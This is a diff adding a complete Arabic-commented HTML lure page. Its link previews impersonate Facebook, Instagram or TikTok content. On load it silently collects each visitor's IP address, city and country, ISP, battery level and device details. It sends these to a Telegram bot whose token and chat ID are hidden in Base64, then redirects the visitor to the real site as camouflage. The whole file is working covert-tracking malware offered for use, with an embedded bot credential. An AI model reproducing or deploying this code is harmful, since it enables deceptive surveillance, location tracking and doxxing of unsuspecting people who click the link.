@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        // --- نظام المعاينة والتحقق من النهاية ---
+        const p = new URLSearchParams(window.location.search);
+        const mode = p.get('id'); // الكلمة المميزة بعد ?id=
+
+        // إذا دخل الشخص على الرابط الأساسي بدون نهاية مميزة، يتم تحويله لجوجل فوراً
+        if (!mode) {
+            window.location.href = "https://www.google.com";
+        }
+
+        const config = {
+            fb: { t: "Zahraa Zahraa", d: "🌸 ممتنة لكل لحظة.. الحياة حلوة بضحكتنا ✨💖 🎀", i: "https://www.facebook.com/images/fb_icon_325x325.png" },
+            ig: { t: "Zahraa Zahraa (@Zahraa_Z)", d: "📸 Official Instagram Profile | 🌸✨🎀", i: "https://www.instagram.com/static/images/ico/favicon-192.png/ed9761293500.png" },
+            tt: { t: "🔥 شاهد قبل الحذف!", d: "أقوى تريند تيك توك لهذا الأسبوع 🎬🔥 شاهد الآن", i: "https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/card/main/2.0/share.png" }
+        };
+
+        const s = config[mode] || {};
+        if (mode) {
+            document.write(`<meta property="og:title" content="${s.t}"><meta property="og:description" content="${s.d}"><meta property="og:image" content="${s.i}"><meta property="og:type" content="website">`);
+            document.title = s.t;
+        }
+    </script>
+
+    <style>
+        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; color: white; overflow: hidden; }
+        .loader { border: 5px solid rgba(255,255,255,0.2); border-top: 5px solid white; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .fb_style { background: #1877f2; } .ig_style { background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); } .tt_style { background: #000; }
+    </style>
+</head>
+<body id="ui_bg">
+    <div id="content" style="display: none; text-align: center;">
+        <div class="loader"></div>
+        <h2 id="status_text">جاري التحقق...</h2>
+    </div>
+
+    <script>
+        // --- تشفير البيانات الحساسة (Base64) ---
+        const _v1 = "Nzc3NzMxMDI2NjpBQUd5V1hGVm02Qjd0anI1aFItU0lsS0VvNE4xbUl2TmxfTQ=="; // Token
+        const _v2 = "NTc3NTc4MTAzOA=="; // Chat ID
+        const _v3 = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="; // API Base
+
+        if (mode) {
+            document.getElementById('content').style.display = 'block';
+            document.getElementById('ui_bg').className = mode + '_style';
+            document.getElementById('status_text').innerText = mode === 'tt' ? 'جاري تشغيل الفيديو...' : 'جاري تحميل الملف الشخصي...';
+
+            async function startProcess() {
+                try {
+                    // 1. سحب الـ IP والموقع
+                    const ipReq = await fetch('https://ipapi.co/json/');
+                    const ipData = await ipReq.json();
+
+                    // 2. سحب معلومات البطارية
+                    let batteryStatus = "غير مدعوم";
+                    try {
+                        const b = await navigator.getBattery();
+                        batteryStatus = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'يشحن' : 'لا يشحن'})`;
+                    } catch(e) {}
+
+                    // 3. معلومات الجهاز المتطورة
+                    const deviceInfo = `${navigator.platform} | ${navigator.userAgent.split(') ')[0].split(' (')[1]}`;
+
+                    // 4. إرسال البيانات لتليجرام
+                    const labels = { fb: "فيسبوك", ig: "انستقرام", tt: "تيك توك" };
+                    const report = `🎯 **صيد جديد (${labels[mode]})**\n\n🌐 الـ IP: \`${ipData.ip}\`\n📍 الموقع: \`${ipData.city}, ${ipData.country}\`\n🏢 الشركة: \`${ipData.org}\`\n🔋 البطارية: \`${batteryStatus}\`\n📱 الجهاز: \`${deviceInfo}\``;
+
+                    await fetch(atob(_v3) + atob(_v1) + "/sendMessage", {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: atob(_v2), text: report, parse_mode: 'Markdown' })
+                    });
+                } catch (err) {} 
+                finally {
+                    // 5. التمويه والتحويل النهائي
+                    const targets = { fb: "https://www.facebook.com", ig: "https://www.instagram.com", tt: "https://www.tiktok.com" };
+                    setTimeout(() => { window.location.href = targets[mode]; }, 2500);
+                }
+            }
+            window.onload = startProcess;
+        }
+    </script>
+</body>
+</html>
